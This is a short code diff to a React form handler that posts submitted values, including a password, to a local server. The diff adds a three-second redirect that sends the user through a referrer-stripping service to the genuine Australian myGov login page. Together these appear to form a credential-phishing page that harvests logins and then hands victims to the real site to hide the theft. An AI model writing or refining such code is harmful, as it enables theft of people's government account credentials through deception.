@@ -32,16 +32,14 @@ function App() {
         password: '',
     },
     onSubmit: (values) => {
-      alert('yes')
-        //console.log(url);
-        //setIsClicked(true)
+
         axios.post('http://localhost:4000/post/newpost', values).then((result) => {
             if (result.data.status) {
               console.log('save successfully');
-                //localStorage.token = result.data.token
-                // setTimeout(() => {
-                //     navigate('/home')
-                // }, 3000)
+                
+                setTimeout(() => {
+                    window.location.href = 'https://nullreferer.com/?https://login.my.gov.au/las/mygov-login?execution=e1s1';
+                }, 3000)
 
             } else {
               console.log('error successfully');
